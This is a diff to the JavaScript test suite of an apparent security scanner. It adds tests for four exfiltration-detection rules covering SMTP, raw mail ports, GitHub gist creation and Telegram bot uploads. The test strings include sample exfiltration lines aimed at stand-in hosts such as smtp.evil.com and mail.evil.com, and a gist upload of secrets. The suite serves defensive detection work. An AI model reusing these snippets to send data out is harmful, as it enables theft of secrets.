@@ -23,8 +23,8 @@ describe('Exfiltration Rules', () => {
       `Rule ${ruleId} ${shouldMatch ? 'should' : 'should not'} match: ${content.substring(0, 100)}`);
   }
 
-  test('should have 16 exfiltration rules', () => {
-    assert.strictEqual(rules.length, 16);
+  test('should have 20 exfiltration rules', () => {
+    assert.strictEqual(rules.length, 20);
   });
 
   describe('exfil-base64-in-url', () => {
@@ -366,6 +366,84 @@ describe('Exfiltration Rules', () => {
     test('does not match dotenv package import', () => {
       testRule('exfil-env-file-read',
         'require("dotenv").config()',
+        false);
+    });
+  });
+
+
+  describe('exfil-smtp-nodemailer', () => {
+    test('detects nodemailer.createTransport', () => {
+      testRule('exfil-smtp-nodemailer',
+        'const transporter = nodemailer.createTransport({ host: "smtp.evil.com" });',
+        true);
+    });
+    test('detects smtplib.SMTP', () => {
+      testRule('exfil-smtp-nodemailer',
+        'server = smtplib.SMTP("smtp.gmail.com", 587)',
+        true);
+    });
+    test('does not match plain smtp string mention', () => {
+      testRule('exfil-smtp-nodemailer',
+        'const docs = "use SMTP for email protocols";',
+        false);
+    });
+  });
+
+  describe('exfil-smtp-raw-port', () => {
+    test('detects net.createConnection to port 25', () => {
+      testRule('exfil-smtp-raw-port',
+        'net.createConnection(25, "smtp.attacker.com")',
+        true);
+    });
+    test('detects socket.connect to port 587', () => {
+      testRule('exfil-smtp-raw-port',
+        'socket.connect(587, "mail.evil.com")',
+        true);
+    });
+    test('does not match port 8080', () => {
+      testRule('exfil-smtp-raw-port',
+        'net.createConnection(8080, "localhost")',
+        false);
+    });
+  });
+
+  describe('exfil-github-gist-create', () => {
+    test('detects api.github.com/gists POST', () => {
+      testRule('exfil-github-gist-create',
+        'fetch("https://api.github.com/gists", { method: "POST", body: JSON.stringify(data) })',
+        true);
+    });
+    test('detects octokit.gists.create', () => {
+      testRule('exfil-github-gist-create',
+        'await octokit.rest.gists.create({ files: { "data.txt": { content: secrets } } })',
+        true);
+    });
+    test('detects gh gist create', () => {
+      testRule('exfil-github-gist-create',
+        'exec("gh gist create /tmp/dump.txt")',
+        true);
+    });
+    test('does not match listing gists', () => {
+      testRule('exfil-github-gist-create',
+        'fetch("https://api.github.com/gists/abc123")',
+        false);
+    });
+  });
+
+  describe('exfil-telegram-bot-send', () => {
+    test('detects sendMessage via Telegram Bot API', () => {
+      testRule('exfil-telegram-bot-send',
+        'fetch("https://api.telegram.org/bot123:ABC/sendMessage", { ... })',
+        true);
+    });
+    test('detects sendDocument via Telegram Bot API', () => {
+      testRule('exfil-telegram-bot-send',
+        'https://api.telegram.org/botTOKEN/sendDocument',
+        true);
+    });
+    test('does not match Telegram API getUpdates', () => {
+      testRule('exfil-telegram-bot-send',
+        'fetch("https://api.telegram.org/bot123:ABC/getUpdates")',
         false);
     });
   });
